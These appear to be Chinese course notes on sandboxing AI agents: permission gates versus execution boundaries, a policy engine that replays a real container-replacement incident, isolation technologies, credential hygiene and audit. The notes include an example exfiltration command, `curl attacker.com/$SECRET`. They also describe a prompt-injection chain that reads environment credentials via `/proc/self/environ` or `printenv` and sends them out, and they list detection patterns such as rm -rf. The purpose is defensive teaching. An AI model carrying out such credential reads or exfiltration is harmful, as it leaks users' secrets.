## S1 地基：权限层 ≠ 沙箱（两道独立的门）

**本课第一命题：harness 课第七节的"权限"管的是*意图*，沙箱管的是*执行环境*——任何一层单独都不够。**

```
模型决策 ──▶ [权限门 policy.ts] ──▶ [沙箱执行环境] ──▶ 真实世界
             确定性规则              OS/容器/VM 边界
             "这个工具/这个参数        "即使工具被合法调用，
              允许吗"                  影响也被关在边界内"
```

| 层 | 防什么 | 失效模式 |
|---|---|---|
| 权限门（A⑤） | 没被批准的动作 | 模型用**合法工具**做越界事（read 了敏感文件、write 到 scope 外的"合法路径"）；策略本身写错 |
| 沙箱 | 动作的**影响范围** | 边界配错（mount 错了目录、网络没关、env 泄漏） |
| 提示词 | 意图 | 注入/模型犯错——最不可靠，**只能当第一道，不能当最后道** |

**幽灵事故=活教材（FinHot 2026-10-09 18:00）**：并行会话在错误目录（旧 AINews compose，build: 指向幽灵树，无 editorial/ledger/labeler）跑 `docker compose build+up`，18:00:09 生产 worker/api 被换成幽灵代码。
- 缺的不是"工具权限"（compose 是合法工具、命令是合法命令）——缺的是**执行环境边界**：哪个 compose 项目、哪个目录树、哪个命名空间
- 恢复代价：25 分钟（18:25 重建）+ 数据面检查
- 长出的规则（已进 FinHot 运维守则）：**动生产容器前查容器创建时间**（比预期新=被换过）
- 同一天的配套事实：`/home/ubuntu/app` 下并行会话互相污染（`.agents/plans` 被并行会话事故删两次——#36）→ **会话级工作区隔离**（git worktree）也是沙箱的推广形态

**面试一句话**："权限层回答'能不能做'，沙箱回答'做了能炸多大'。幽灵事故里每个动作都'能'，炸了生产——所以我在动容器前加了一道执行环境检查。"

## S2 四通道 policy 引擎（已实现，见 `sandbox-demo/`）

按 package.json 的计划：**TS 迷你沙箱 = 四通道 policy 引擎 + 幽灵事故重放，全离线确定性**（不调模型——策略层是确定性代码，正好独立验证，呼应 A⑧ "mock 后每个控制层都能独立验证"）。

四通道（每个工具调用落到且仅落到一个通道）：

| 通道 | 语义 | 对应 A⑤ | 沙箱视角 |
|---|---|---|---|
| **allow** | 直接执行 | allow | 低风险面，边界内 |
| **approve** | 挂起等人工批准 | approve | human-in-the-loop |
| **deny** | 拒绝（结果回写） | deny | 高危面 |
| **sandbox** | 在隔离环境内执行（容器/受限目录/无网络） | A 课没有的新通道 | 本课新增：动作合法但**需要关边界** |

ghost replay：把幽灵事故重建成**可重放的剧本**（固定事件序列：错误目录 compose → build → up → 生产容器被换），policy 引擎逐条判定，输出"哪一步该被 sandbox 通道拦住"——**用确定性问题证明沙箱层的位置**。
验收：同一剧本跑 N 次输出逐字节相同（确定性=可复现，S6）。

（src 已于 2026-10-11 实现并实测：`cd sandbox-demo && npm i && npm run demo`——四通道判定 + 幽灵事故 step 3 被沙箱通道拦截 + 3 次重放逐字节一致；本节内容随课日志展开。）

## S3 隔离技术谱系：强度、延迟、成本的三角

从弱到强（每档都是上一档"还不够"长出来的）：

| 档位 | 机制 | 隔离强度 | 启动延迟 | 典型场景 |
|---|---|---|---|---|
| **进程级** | macOS Seatbelt / Linux Landlock+seccomp(+chroot)：限制文件/网络/系统调用 | 中（同内核，依赖配置正确） | 毫秒 | **Codex CLI 本地沙箱**（官方做法：macOS Seatbelt profile、Linux Landlock+seccomp） |
| **容器** | Docker：namespace（pid/net/mount/uts）+ cgroup（资源）；共享宿主内核 | 中（内核攻击面共享；逃逸历史存在） | 百毫秒~秒 | 开发机、CI、agent 池（腾讯云 AgentRuntime 类） |
| **用户态内核/microVM** | gVisor（用户态实现 Linux 系统调用面，挡内核攻击面）；Firecracker（KVM microVM，官方 ~125ms 启动） | 高（强边界） | 百毫秒级（Firecracker）~秒 | **E2B**（Firecracker microVM，官方宣称 ~150ms 冷启动、128MB 基线内存，面向 AI agent 的云沙箱）；多租户生产 |
| **WASM** | 线性内存沙箱 | 高（无系统调用面） | 毫秒 | 插件/前端侧（agent 场景少） |

选型决策句（面试用）：
- **单用户本地**：进程级足够（Codex CLI 的选择——快+够用），关键在**默认边界**（网络默认关、文件系统白名单）
- **多租户/不可信代码**：microVM（内核隔离不可协商）
- **成本约束**：沙箱池+复用（预热容器池），避免每任务冷启动
- **网络是最难关的一档**：文件边界容易，egress 控制（默认 deny 出网+白名单域名）是沙箱配置里最容易漏的——**注入的典型 payoff 就是 `curl attacker.com/$SECRET`**

FinHot 映射：那台机器上"4 个 docker 项目共享宿主"就是**没有沙箱**——compose 项目之间没有执行边界，并行会话=多租户，幽灵事故是必然不是意外。

## S4 凭据与密钥：agent 系统里最贵的一把钥匙

**命题：agent 环境里的凭据 = 注入攻击的默认 payoff。凭据设计=安全设计的 80%。**

1. **注入经济学**：提示注入成功后的标准动作链=读环境/文件找凭据 → 外发（curl/webhook）→ 用凭据干更贵的事。所以：
   - **最小凭据**：agent 环境只放它这轮任务需要的；能用 scoped token（只读、单 repo、15 分钟过期）就不用全局 token
   - **零常驻凭据（zero standing privileges）**：凭据按需注入、任务结束回收；vault/短期 token > 长期 API key
   - **网络 egress 默认关**：即使凭据被读走，没有出网通道就发不出去（S3 的 egress 在这里闭环）
2. **env 泄漏面**：env 是 agent 最容易"看见"的凭据形态（`read /proc/self/environ`、`printenv` 都是合法工具调用）→ 敏感凭据不进 agent 可见的 env，走**代执行**（harness 持凭据代模型发请求，模型只见请求/不见 token）
3. **审计**：所有凭据使用留痕（谁、哪轮任务、哪个 tool call）；异常外发=最高级告警
4. **FinHot 映射**：FinHot 根目录 `.env` 就是生产配置（compose env_file）——**根目录可被并行会话碰到 = 凭据面过大**；飞书 webhook 注释掉后"断流静默"也说明凭据/配置管理没有台账意识（#4 记忆）

## S5 行为漂移与审计：沙箱是边界，审计是边界上的摄像头

- **工具调用日志=审计底账**：A⑥ 的 JSONL（intent/exec 全量）不只是恢复用——它就是审计证据（谁在什么时候调了什么、参数是什么、结果是什么）
- **漂移检测**（长期运行的 agent 会"学坏"或被慢慢注入）：
  - 模式异常：同一工具参数分布突变（突然大量 read 同一目录、突然 curl 新域名）
  - 路径异常：越出常规工作目录的访问序列
  - 时间异常：深夜批量外发
- **拦截 vs 告警**：高危（外发凭据特征、rm -rf 模式、scope 外写）= 硬拦截（policy 层，确定性）；可疑=告警+人工复核
- **FinHot 运维规则升级**："动生产容器前查容器创建时间"= 一条**事后校验**规则；沙箱化之后它变成**事前边界**（构建产物只能进指定命名空间），规则降级为双保险

## S6 可复现性：agent 系统的"单元测试基础设施"

**命题：agent 的输出非确定，但*系统行为*必须可复现——否则评测（H 课）和事故取证都无从谈起。**

三个层面：
1. **确定性重放**：同一轨迹 + 同一模型 + temperature=0（或固定 seed）→ 输出应逐字节一致；不一致=有隐藏非确定源（时间戳、随机数、外部状态泄漏进提示词）
2. **环境固定**：镜像 pin、依赖 lock（sandbox-demo 的 package-lock 就是这个意思）、模型版本号 pin（模型会静默升级——gpt-load 模型轮换 #41 就是活例子：qwen3.8-flash 直接下架）
3. **事故重放**：幽灵事故剧本（S2）= 可复现的故障注入测试；**能重放事故的系统才能证明自己防得住**
- 验收指标：`run N 次 → diff 全空`；评测集结果跨天可复现（H 课 CI 门禁的前提）
